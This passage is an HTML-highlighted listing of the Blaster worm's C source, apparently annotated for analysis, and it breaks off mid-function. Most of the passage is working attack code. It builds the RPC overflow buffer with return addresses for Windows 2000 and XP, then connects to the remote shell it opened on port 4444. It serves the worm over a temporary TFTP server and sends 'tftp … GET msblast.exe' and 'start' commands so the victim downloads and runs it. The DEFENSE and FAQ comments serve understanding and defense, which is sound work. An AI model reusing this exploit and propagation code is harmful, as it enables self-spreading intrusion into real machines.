</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x88</span><span class="sc10">,</span><span class="sc4">0x2A</span><span class="sc10">,</span><span class="sc4">0x0C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x28</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x0C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x07</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ThreadId</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sizeof_sa</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">opt</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hThread</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">target_ip</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sa</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">cmdstr</span><span class="sc10">[</span><span class="sc4">0x200</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf2</span><span class="sc10">[</span><span class="sc4">0x1000</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* 
* Turn off non-blocking (i.e. re-enable blocking mode) 
* DEFENSE: Tarpit programs (e.g. 'labrea' or 'deredoc')
* will slow down the spread of this worm. It takes a long
* time for blocking calls to timeout. I had several 
* thousand worms halted by my 'deredoc' tarpit.
*/</span><span class="sc0">
</span><span class="sc11">opt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ioctlsocket</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FIONBIO</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">opt</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/*
* Choose whether the exploit targets Win2k or WinXP.
*/</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">winxp1_or_win2k2</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x100139d</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">else</span><span class="sc0">
</span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x18759f</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">+</span><span class="sc4">36</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ret</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/* ----------------------------------------------
* This section is just copied from the original exploit
* script. This is the same as the scripts that have been
* widely published on the Internet. */</span><span class="sc0">
</span><span class="sc11">len</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf2</span><span class="sc10">,</span><span class="sc11">request1</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request1</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">len1</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request1</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">request2</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">request2</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)/</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">request2</span><span class="sc10">+</span><span class="sc4">8</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">request2</span><span class="sc10">+</span><span class="sc4">8</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)/</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc11">len1</span><span class="sc10">,</span><span class="sc11">request2</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request2</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">len1</span><span class="sc10">=</span><span class="sc11">len1</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc11">len1</span><span class="sc10">,</span><span class="sc11">sc</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">len1</span><span class="sc10">=</span><span class="sc11">len1</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc11">len1</span><span class="sc10">,</span><span class="sc11">request3</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request3</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">len1</span><span class="sc10">=</span><span class="sc11">len1</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request3</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc11">len1</span><span class="sc10">,</span><span class="sc11">request4</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request4</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">len1</span><span class="sc10">=</span><span class="sc11">len1</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request4</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">8</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">8</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x10</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x10</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x80</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x80</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x84</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x84</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0xb4</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0xb4</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0xb8</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0xb8</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0xd0</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0xd0</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x18c</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x18c</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc11">bindstr</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">bindstr</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">)==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc2">//perror("- Send");
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc11">buf2</span><span class="sc10">,</span><span class="sc11">len1</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">)==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc2">//perror("- Send");
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">400</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc1">/* ----------------------------------------------*/</span><span class="sc0">


</span><span class="sc1">/*
* This section of code connects to the victim on port 4444.
* DEFENSE : This means you can block this worm by blocking
* TCP port 4444.
* FAQ: This port is only open for the brief instant needed
* to exploit the victim. Therefore, you can't scan for 
* port 4444 in order to find Blaster victims.
*/</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">target_ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">target_ip</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">target_ip</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">target_ip</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">SHELL_PORT_4444</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">target_ip</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">victim_ip</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">target_ip</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">*)&amp;</span><span class="sc11">target_ip</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">target_ip</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/*
* This section recreates the IP address from whatever IP
* address this successfully connected to. In practice,
* the strings "victim_ip" and "target_ip_string" should be
* the same.
*/</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">target_ip_string</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">target_ip_string</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">sizeof_sa</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sa</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">getsockname</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">*)&amp;</span><span class="sc11">sa</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sizeof_sa</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">target_ip_string</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%d.%d.%d.%d"</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc11">sa</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_net</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sa</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_host</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc11">sa</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_lh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sa</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_impno</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/*
* This section creates a temporary TFTP service that is 
* ONLY alive during the period of time that the victim
* needs to download.
* FAQ: You can't scan for TFTP in order to find Blaster 
* victims because the port is rarely open.
*/</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd_tftp_service</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">fd_tftp_service</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">hThread</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc11">blaster_tftp_thread</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">ThreadId</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">80</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/*give time for thread to start*/</span><span class="sc0">

</span><span class="sc1">/*
* This sends the command
* tftp -i 1.2.3.4 GET msblast.exe
* to the victim. The "tftp.exe" program is built into
* Windows. It's intended purpose is to allow users to 
* manually update their home wireless access points with
* new software (and other similar tasks). However, it is
* not intended as a generic file-transfer protocol (it
* stands for "trivial-file-transfer-protocol" -- it is
* intended for only trivial tasks). Since a lot of hacker
* exploits use the "tftp.exe" program, a good hardening
* step is to remove/rename it.
*/</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">cmdstr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tftp -i %s GET %s\n"</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc11">target_ip_string</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MSBLAST_EXE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cmdstr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cmdstr</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">closesocket_and_return</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* 
* Wait 21 seconds for the victim to request the file, then
* for the file to be delivered via TFTP.
*/</span><span class="sc0">
</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">1000</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">10</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">is_tftp_running</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">2000</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/*
* Assume the the transfer is successful, and send the 
* command to start executing the newly downloaded program.
* BUFORD: The hacker starts this twice. Again, it 
* demonstrates a lock of confidence, so he makes sure it's
* started by doing it twice in slightly different ways.
* Note that the "BILLY" mutex will prevent from actually
* running twice.
*/</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">cmdstr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"start %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MSBLAST_EXE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cmdstr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cmdstr</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">closesocket_and_return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">2000</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">cmdstr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MSBLAST_EXE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cmdstr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cmdstr</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">2000</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc1">/*
* This section closes the things started in this procedure
*/</span><span class="sc0">
</span><span class="sc11">closesocket_and_return</span><span class="sc10">:</span><span class="sc0">

</span><span class="sc1">/* Close the socket for the remote command-prompt that has
* been established to the victim. */</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/* Close the TFTP server that was launched above. As noted,
* this means that the TFTP service is not running most of
* the time, so it's not easy to scan for infected systems.
*/</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">is_tftp_running</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">TerminateThread</span><span class="sc10">(</span><span class="sc11">hThread</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">fd_tftp_service</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">is_tftp_running</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hThread</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc3">/**
* Convert the name into an IP address. If the IP address
* is formatted in decimal-dot-notation (e.g. 192.2.0.43),
* then return that IP address, otherwise do a DNS lookup
* on the address. Note that in the case of the worm,
* it always gives the string "windowsupdate.com" to this
* function, and since Microsoft turned off that name,
* the DNS lookup will usually fail, so this function
* generally returns -1 (SOCKET_ERROR), which means the
* address 255.255.255.255.
*/</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">blaster_resolve_ip</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">windowsupdate_com</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">windowsupdate_com</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">HOSTENT</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p_hostent</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">gethostbyname</span><span class="sc10">(</span><span class="sc11">windowsupdate_com</span><span class="sc10">);</span><span class="sc0">
